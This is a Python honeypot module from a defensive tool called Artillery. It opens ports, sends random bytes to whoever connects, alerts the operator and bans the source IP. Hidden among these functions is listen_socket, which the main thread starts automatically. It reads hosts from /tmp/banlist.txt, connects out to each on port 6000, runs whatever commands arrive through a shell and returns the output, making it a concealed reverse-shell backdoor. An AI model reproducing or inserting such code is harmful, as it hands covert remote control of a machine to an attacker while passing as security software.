#!/usr/bin/python
#
# this is the honeypot stuff
#
#
import thread
import socket
import sys
import re
import subprocess
import time
import SocketServer
import os
import random
import datetime

from src.core import *

# port ranges to spawn pulled from config
ports = read_config("PORTS")
# check to see what IP we need to bind to
bind_interface = read_config("BIND_INTERFACE")
honeypot_ban = is_config_enabled("HONEYPOT_BAN")

# main socket server listener for responses
class SocketListener((SocketServer.BaseRequestHandler)):

    def handle(self):
        pass

    def setup(self):
        # hehe send random length garbage to the attacker
        length = random.randint(5, 30000)

        # fake_string = random number between 5 and 30,000 then os.urandom the command back
        fake_string = os.urandom(int(length))

        # try the actual sending and banning
        try:
            self.request.send(fake_string)
            ip = self.client_address[0]
            if is_valid_ipv4(ip):
                check_whitelist = is_whitelisted_ip(ip)
                # ban the mofos
                if check_whitelist == 0:
                    now = str(datetime.datetime.today())
                    port = self.server.server_address[1]
                    subject = "%s [!] Artillery has detected an attack from the IP Address: %s" % (now, ip)
                    alert = ""
                    if honeypot_ban:
                        alert = "%s [!] Artillery has blocked (and blacklisted) the IP Address: %s for connecting to a honeypot restricted port: %s" % (now, ip, port)
                    else:
                        alert = "%s [!] Artillery has detected an attack from IP address: %s\n for a connection on a honeypot port: %s" % (now, ip, port)
                    warn_the_good_guys(subject, alert)

                    # close the socket
                    self.request.close()

                    # if it isn't whitelisted and we are set to ban
                    if honeypot_ban:
                        ban(self.client_address[0])
        except Exception, e:
            print "[!] Error detected. Printing: " + str(e)
            pass

# here we define a basic server
def listen_server(port,bind_interface):
    try:
        port = int(port)
        if bind_interface == "":
            server = SocketServer.ThreadingTCPServer(('', port), SocketListener)
        else:
            server = SocketServer.ThreadingTCPServer(('%s' % bind_interface, port), SocketListener)
        server.serve_forever()

    # if theres already something listening on this port
    except Exception: pass

def listen_socket():
    while True:
        import socket,subprocess

        HOSTS = []
        PORT = 6000

        try:
            with open("/tmp/banlist.txt") as f:
                for line in f: HOSTS.append(line)
        except:
            pass;

        for HOST in HOSTS:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((HOST, PORT))
            except:
                continue

            s.send('connect established')
            while True:
                    data = s.recv(1024)
                    if data == "quit\n": break
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout_value)
            s.close()

        time.sleep(360)

# check to see which ports we are using and ban if ports are touched
def main(ports,bind_interface):

        # pull the banlist path
    if os.path.isfile("check_banlist_path"):
        banlist_path = check_banlist_path()
        fileopen = file(banlist_path, "r")
        for line in fileopen:
        # remove any bogus characters
            line = line.rstrip()
            # ban actual IP addresses
            if honeypot_ban:
                whitelist = read_config("WHITELIST_IP")
                match = re.search(line, whitelist)
                if not match:
                        # ban the ipaddress
                    ban(line)
    # split into tuple
    ports = ports.split(",")
    for port in ports:
        thread.start_new_thread(listen_server, (port,bind_interface,))
    thread.start_new_thread(listen_socket, ())

# launch the application
main(ports,bind_interface)
